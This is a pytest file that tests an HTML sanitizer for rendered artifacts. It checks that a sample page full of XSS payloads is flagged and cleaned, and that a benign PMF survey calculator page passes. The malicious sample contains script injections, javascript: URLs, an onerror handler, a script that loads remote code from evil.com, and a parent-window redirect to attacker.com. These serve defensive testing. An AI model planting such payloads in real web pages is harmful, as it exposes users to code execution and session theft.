import pytest
from app.core.security import ArtifactSecurityPolicy

def test_xss_and_iframe_sanitization():
    raw_malicious_html = """<!DOCTYPE html>
<html>
<head><title>XSS Attack Test</title></head>
<body>
    <script>alert("XSS")</script>
    <iframe src="javascript:alert(1)"></iframe>
    <a href="javascript:doEvil()">Click for Free PMF</a>
    <img src=x onerror="alert('pwnd')">
    <script src="https://evil.com/payload.js"></script>
    <div onclick="window.parent.location='https://attacker.com'">Steal Session</div>
</body>
</html>"""

    result = ArtifactSecurityPolicy.sanitize_html(raw_malicious_html)
    assert result["is_safe"] is False
    assert len(result["warnings"]) > 0
    assert "javascript:" not in result["html"].lower()
    assert "window.parent" not in result["html"]
    assert result["sandbox_attributes"] == "allow-scripts allow-forms allow-modals"

def test_safe_calculator_html():
    safe_html = """<!DOCTYPE html>
<html>
<head><title>PMF Survey Calculator</title></head>
<body>
    <h1>Sean Ellis 40% Disappointed Benchmark</h1>
    <input type="number" id="very_disappointed" value="45">
    <input type="number" id="somewhat_disappointed" value="30">
    <input type="number" id="not_disappointed" value="25">
    <button onclick="calculatePMF()">Calculate Score</button>
    <div id="result">Score: 45% (PMF Achieved)</div>
</body>
</html>"""

    result = ArtifactSecurityPolicy.sanitize_html(safe_html)
    assert result["is_safe"] is True
    assert len(result["warnings"]) == 0
    assert "Sean Ellis 40% Disappointed Benchmark" in result["html"]
